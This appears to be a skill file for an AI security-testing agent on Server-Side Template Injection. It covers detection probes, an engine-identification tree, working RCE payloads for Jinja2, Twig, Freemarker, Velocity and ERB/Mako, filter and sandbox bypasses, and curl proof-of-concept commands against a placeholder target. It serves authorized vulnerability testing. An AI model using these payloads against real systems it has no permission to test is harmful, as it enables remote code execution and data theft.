---
name: ssti
description: "Server-Side Template Injection -> RCE or file read. Use when input is rendered by a template engine (Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Handlebars, Pug, Mako), when {{7*7}} or ${7*7} evaluates to 49, or in email templates / preview / name / greeting fields."
---

# SSTI — Server-Side Template Injection

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


Injecting native template syntax into a template that is then executed server-side. Distinct from XSS: the payload runs in the template engine on the server, not the browser. Frequently escalates to full RCE.

## When to test
Any feature that renders user-controlled input through a template engine:
- Email/notification templates, "customize your message" features, marketing previews.
- Custom pages, themes, CMS blocks, report/PDF/invoice generators.
- Name / greeting / subject / preview fields echoed back ("Hello {name}").
- Any context where you see `${...}`, `{{...}}`, `{%...%}`, `<%= ... %>`, `#{...}`, or `*{...}` round-tripping.
- Error pages or stack traces that mention Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Handlebars, Pug, Mako, Thymeleaf.

## Impact & priority
- RCE on the backend = P1/critical. Prove with harmless `id` or `hostname` only.
- Sandboxed engines (no RCE): arbitrary file read, env var / secret disclosure, config leakage = still high.
- Math-eval-only with no reachable data/RCE path = low/informational. Do not over-report (see "Don't report as noise").

## Detection
Two contexts — determine which you are in.

**Plaintext context** — input lands in template text (e.g. `Hello <name>`):
- Inject a math probe and check the rendered output is computed, not echoed literally.
- `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `${{7*7}}` → output `49` confirms server-side eval.

**Code context** — input lands inside an existing expression (e.g. `greeting=data.username`):
- Plain math may already evaluate, so it proves nothing. First inject HTML (`<x>`) to rule out plain XSS.
- Break out of the expression and add your own: e.g. `}}<x>` or `${user}<x>` — if HTML renders AND the breakout doesn't error, suspect SSTI.

**Fuzzing trigger set:** `${{<%[%'"}}%\` — a template error / stack trace strongly indicates SSTI and often names the engine.

**`{{7*7}}` vs `${7*7}` decision tree:**
```
Send {{7*7}}  -> 49 ?
   |-- yes -> send {{7*'7'}}
   |          |-- 49        -> Twig (PHP)
   |          |-- 7777777   -> Jinja2 (Python)
   |          \-- error/raw -> Handlebars/other {{ }} engine
   \-- no  -> Send ${7*7} -> 49 ?
              |-- yes -> Freemarker / Velocity (Java) / JSP EL / Smarty($)
              \-- no  -> Send <%= 7*7 %> -> 49 ? -> ERB(Ruby) / EJS / ASP
                          \-- no -> #{7*7}=49 -> Pug/Jade / Thymeleaf #{}/${} 
```
Then confirm the engine with an invalid-syntax probe and read the error, or use the engine fingerprints in `cheatsheet.md`.

## Exploitation
After identifying the engine: **Read** docs/known exploits → **Explore** exposed objects → **Create** the chain to RCE or file read. Verify with harmless commands (`id`, `hostname`, `cat /etc/hostname`) — never anything destructive.

- Jinja2: walk `{{ ().__class__.__bases__[0].__subclasses__() }}` to a useful class, or `{{ self.__init__.__globals__ }}` / `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
- Twig: `{{ ['id']|filter('system') }}` or `{{ _self.env.registerUndefinedFilterCallback('system') }}`.
- Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- Velocity: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")` (chain to read output).
- ERB/Mako (Ruby/Python): direct code blocks — `<%= \`id\` %>` / `<% import os ... os.popen('id') %>`.
- Sandboxed: pivot to exposed/developer objects for file read or secret disclosure instead.

Full per-engine payloads (info disclosure + RCE) in `cheatsheet.md`.

## Common bypasses
- Sandbox escapes: reach `os`/`Runtime`/`subprocess` via object/class chains (`__mro__`, `__subclasses__`, `_self.env`).
- Filtered chars/keywords: attribute access via `request|attr('...')`, `["__cl"+"ass__"]`, hex/unicode, `getattr`, concatenation.
- Blocked builtins: read the engine's own security docs — listed dangerous builtins are your roadmap.
- See `reference.md` and `cheatsheet.md` for the full catalog.

## Minimal PoC (for ./_EXPLOIT/)
Log a minimal curl: first show template eval, then escalate to command output.
```bash
# 1) Confirm evaluation (Jinja2 example)
curl -s 'https://TARGET/preview?name=%7B%7B7*7%7D%7D' | grep -o '49'

# 2) Escalate to harmless command output (RCE proof)
curl -s 'https://TARGET/preview?name=%7B%7Bcycler.__init__.__globals__.os.popen(%27id%27).read()%7D%7D'
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Capture: request, the `49` reflection, and the `id` output. That pair is the proof.

## Don't report as noise
- `{{7*7}}=49` alone, with no demonstrated path to data or code execution, is weak — show real impact.
- Client-side-only template rendering (browser) is not SSTI.
- Always demonstrate the concrete consequence: command output, a read file's contents, or a leaked secret/env var.

## Deep reference
See `reference.md` (methodology, engine ID, walkthroughs, prevention) and `cheatsheet.md` (per-engine payload tables).
- https://portswigger.net/web-security/server-side-template-injection
- https://portswigger.net/web-security/server-side-template-injection/exploiting
